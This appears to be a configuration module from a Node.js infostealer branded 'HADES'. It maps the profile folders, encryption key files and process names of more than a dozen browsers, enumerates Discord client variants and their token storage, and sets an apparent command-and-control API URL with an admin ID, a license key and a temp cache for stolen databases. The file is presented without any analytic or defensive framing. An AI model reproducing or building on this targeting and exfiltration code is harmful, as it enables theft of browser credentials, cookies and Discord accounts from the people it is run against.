Object.defineProperty(exports, "__esModule", {
  value: true
});
const os = require("os");
const path = require("path");
const fs = require("fs");
async function getAllDiscordPaths() {
  const paths = [];
  for (const [name, variant] of Object.entries(exports.DISCORD_VARIANTS)) {
    if (fs.existsSync(variant.root)) {
      const storage = path.join(variant.root, "Local Storage", "leveldb");
      if (fs.existsSync(storage)) paths.push({
        name,
        path: variant.root
      });
    }
  }
  const browsers = exports.CONFIG.USER_DATA ? Object.values(exports.CONFIG.USER_DATA) : [];
  browsers.forEach(browser => {
    if (fs.existsSync(browser.user_data)) paths.push({
      name: browser.name,
      path: browser.user_data
    });
  });
  return paths;
}
exports.getAllDiscordPaths = getAllDiscordPaths;
exports.local = path.join(os.homedir(), "AppData", "Local");
exports.roaming = path.join(os.homedir(), "AppData", "roaming");
exports.CONFIG = {
  API_URL: "https://nd51mnuvfh2i.wiestonunanasikasar.win",
  ADMIN_ID: "6866828704",
  LICENSE_KEY: "HADES_outlawssx_84699D7527F9569B2C41D82F897CA39D",
  USER_DATA: {
    chrome: {
      name: "Google Chrome",
      local_state: path.join(exports.local, "Google/Chrome/User Data/Local State"),
      user_data: path.join(exports.local, "Google/Chrome/User Data"),
      key_name: "Google Chromekey1",
      process_name: "chrome.exe"
    },
    edge: {
      name: "Microsoft Edge",
      local_state: path.join(exports.local, "Microsoft/Edge/User Data/Local State"),
      user_data: path.join(exports.local, "Microsoft/Edge/User Data"),
      key_name: "Microsoft Edgekey1",
      process_name: "msedge.exe"
    },
    brave: {
      name: "Brave Browser",
      local_state: path.join(exports.local, "BraveSoftware/Brave-Browser/User Data/Local State"),
      user_data: path.join(exports.local, "BraveSoftware/Brave-Browser/User Data"),
      key_name: "Bravekey1",
      process_name: "brave.exe"
    },
    opera: {
      name: "Opera Stable",
      local_state: path.join(exports.roaming, "Opera Software/Opera Stable/Local State"),
      user_data: path.join(exports.roaming, "Opera Software/Opera Stable"),
      key_name: "Opera Stablekey1",
      process_name: "opera.exe"
    },
    operaGX: {
      name: "Opera GX Stable",
      local_state: path.join(exports.roaming, "Opera Software/Opera GX Stable/Local State"),
      user_data: path.join(exports.roaming, "Opera Software/Opera GX Stable"),
      key_name: "Opera GX Stable",
      process_name: "opera.exe"
    },
    vivaldi: {
      name: "Vivaldi",
      local_state: path.join(exports.local, "Vivaldi/User Data/Local State"),
      user_data: path.join(exports.local, "Vivaldi/User Data"),
      key_name: "Vivaldikey1",
      process_name: "vivaldi.exe"
    },
    yandex: {
      name: "Yandex Browser",
      local_state: path.join(exports.local, "Yandex/YandexBrowser/User Data/Local State"),
      user_data: path.join(exports.local, "Yandex/YandexBrowser/User Data"),
      key_name: "Yandexkey1",
      process_name: "yandex.exe"
    },
    orbitum: {
      name: "Orbitum",
      local_state: path.join(exports.local, "Orbitum/User Data/Local State"),
      user_data: path.join(exports.local, "Orbitum/User Data"),
      key_name: "Orbitumkey1",
      process_name: "orbitum.exe"
    },
    atom: {
      name: "Atom",
      local_state: path.join(exports.local, "Mail.Ru/Atom/User Data/Local State"),
      user_data: path.join(exports.local, "Mail.Ru/Atom/User Data"),
      key_name: "Atomkey1",
      process_name: "atom.exe"
    },
    kometa: {
      name: "Kometa",
      local_state: path.join(exports.local, "Kometa/User Data/Local State"),
      user_data: path.join(exports.local, "Kometa/User Data"),
      key_name: "Kometakey1",
      process_name: "kometa.exe"
    },
    torch: {
      name: "Torch",
      local_state: path.join(exports.local, "Torch/User Data/Local State"),
      user_data: path.join(exports.local, "Torch/User Data"),
      key_name: "Torchkey1",
      process_name: "torch.exe"
    },
    amigo: {
      name: "Amigo",
      local_state: path.join(exports.local, "Amigo/User Data/Local State"),
      user_data: path.join(exports.local, "Amigo/User Data"),
      key_name: "Amigokey1",
      process_name: "amigo.exe"
    },
    coccoc: {
      name: "CocCoc",
      local_state: path.join(exports.local, "CocCoc/Browser/User Data/Local State"),
      user_data: path.join(exports.local, "CocCoc/Browser/User Data"),
      key_name: "CocCockey1",
      process_name: "coccoc.exe"
    },
    uran: {
      name: "Uran",
      local_state: path.join(exports.local, "uCozMedia/Uran/User Data/Local State"),
      user_data: path.join(exports.local, "uCozMedia/Uran/User Data"),
      key_name: "Urankey1",
      process_name: "uran.exe"
    },
    slimjet: {
      name: "Slimjet",
      local_state: path.join(exports.local, "FlashPeak/Slimjet/User Data/Local State"),
      user_data: path.join(exports.local, "FlashPeak/Slimjet/User Data"),
      key_name: "Slimjetkey1",
      process_name: "slimjet.exe"
    },
    ivaldi: {
      name: "Ivaldi",
      local_state: path.join(exports.local, "Ivaldi/User Data/Local State"),
      user_data: path.join(exports.local, "Ivaldi/User Data"),
      key_name: "Ivaldikey1",
      process_name: "ivaldi.exe"
    },
    firefox: {
      name: "Mozilla Firefox",
      user_data: path.join(exports.roaming, "Mozilla/Firefox/Profiles"),
      key_name: "Firefoxkey1",
      process_name: "firefox.exe"
    }
  },
  TMP_DIR: path.join(os.tmpdir(), "hades_cache"),
  SQLITE_DIR: path.join(os.tmpdir(), "hades_cache", "databases"),
  AllDiscordPaths: getAllDiscordPaths,
  ELECTRON_THEME: null
};
exports.DISCORD_VARIANTS = {
  Discord: {
    root: path.join(exports.roaming, "discord"),
    local: path.join(exports.local, "Discord")
  },
  "Discord Canary": {
    root: path.join(exports.roaming, "discordcanary"),
    local: path.join(exports.local, "DiscordCanary")
  },
  "Discord PTB": {
    root: path.join(exports.roaming, "discordptb"),
    local: path.join(exports.local, "DiscordPTB")
  },
  "Discord Development": {
    root: path.join(exports.roaming, "discorddevelopment"),
    local: path.join(exports.local, "DiscordDevelopment")
  },
  Lightcord: {
    root: path.join(exports.roaming, "Lightcord"),
    local: path.join(exports.local, "Lightcord")
  },
  Vencord: {
    root: path.join(exports.roaming, "Vencord"),
    local: path.join(exports.local, "Vencord")
  },
  BetterDiscord: {
    root: path.join(exports.roaming, "BetterDiscord"),
    local: path.join(exports.local, "BetterDiscord")
  }
};
